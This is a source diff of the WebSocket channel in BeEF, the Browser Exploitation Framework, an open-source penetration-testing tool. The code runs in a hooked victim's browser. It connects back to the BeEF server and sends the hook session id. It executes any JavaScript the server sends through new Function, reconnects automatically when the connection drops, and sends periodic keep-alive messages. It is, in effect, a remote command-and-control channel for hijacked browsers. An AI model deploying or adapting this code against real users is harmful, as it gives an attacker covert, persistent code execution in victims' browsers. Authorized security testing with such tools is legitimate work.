@@ -1,75 +1,91 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
-//
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
+// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
 
-//beef.websocket.socket.send(take answer to server beef)
-/*New browser init call this */
+
+/**
+ * @Literal object: beef.websocket
+ *
+ * Manage the WebSocket communication channel.
+ * This channel is much faster and responsive, and it's used automatically
+ * if the browser supports WebSockets AND beef.http.websocket.enable = true.
+ */
 
 beef.websocket = {
 
     socket:null,
-    alive_timer:<%= @websocket_timer %>,
+    ws_poll_timeout: "<%= @ws_poll_timeout %>",
 
+    /**
+     * Initialize the WebSocket client object.
+     * Note: use WebSocketSecure only if the hooked domain is under https.
+     * Mixed-content in WS is quite different from a non-WS context.
+     */
     init:function () {
         var webSocketServer = beef.net.host;
-        var webSocketPort = <%= @websocket_port %>;
-        var webSocketSecure = <%= @websocket_secure %>;
+        var webSocketPort = "<%= @websocket_port %>";
+        var webSocketSecure = "<%= @websocket_secure %>";
         var protocol = "ws://";
-        //console.log("We are inside init");
-        /*use wss only if hooked domain is under https. Mixed-content in WS is quite different from a non-WS context*/
+
         if(webSocketSecure && window.location.protocol=="https:"){
             protocol = "wss://";
-        webSocketPort= <%= @websocket_sec_port %>;
+            webSocketPort= "<%= @websocket_sec_port %>";
         }
 
-    if (beef.browser.isFF() && !!window.MozWebSocket) {
-        beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
-
-        } else {
-        beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
+        if (beef.browser.isFF() && !!window.MozWebSocket) {
+            beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
+        }else{
+            beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
         }
 
     },
-    /* send Helo message to the BeEF server and start async communication*/
+
+    /**
+     * Send Helo message to the BeEF server and start async polling.
+     */
     start:function () {
         new beef.websocket.init();
         this.socket.onopen = function () {
-        //console.log("Socket has been opened!");
-
-        /*send browser id*/
-        beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
-            //console.log("Connected and Helo");
+            beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
             beef.websocket.alive();
-        }
+        };
+
         this.socket.onmessage = function (message) {
-            //console.log("Received message via WS."+ message.data);
-            eval(message.data);
-        }
+            // Data coming from the WebSocket channel is either of String, Blob or ArrayBufferdata type.
+            // That's why it needs to be evaluated first. Using Function is a bit better than pure eval().
+            // It's not a big deal anyway, because the eval'ed data comes from BeEF itself, so it is implicitly trusted.
+            new Function(message.data)();
+        };
 
+        this.socket.onclose = function () {
+            setTimeout(function(){beef.websocket.start()}, 5000);
+        };
     },
 
+    /**
+     * Send data back to BeEF. This is basically the same as beef.net.send,
+     * but doesn't queue commands.
+     * Example usage:
+     * beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
+     * '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
+     * '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
+     */
     send:function (data) {
-        this.socket.send(data);
-//        console.log("Sent [" + data + "]");
+        try {
+            this.socket.send(data);
+        }catch(err){}
     },
 
+    /**
+     * Polling mechanism, to notify the BeEF server that the browser is still hooked,
+     * and the WebSocket channel still alive.
+     * todo: there is probably a more efficient way to do this. Double-check WebSocket API.
+     */
     alive: function (){
         beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
-//        console.log("sent alive");
-        setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);
-
+        setTimeout("beef.websocket.alive()", beef.websocket.ws_poll_timeout);
     }
 };
 
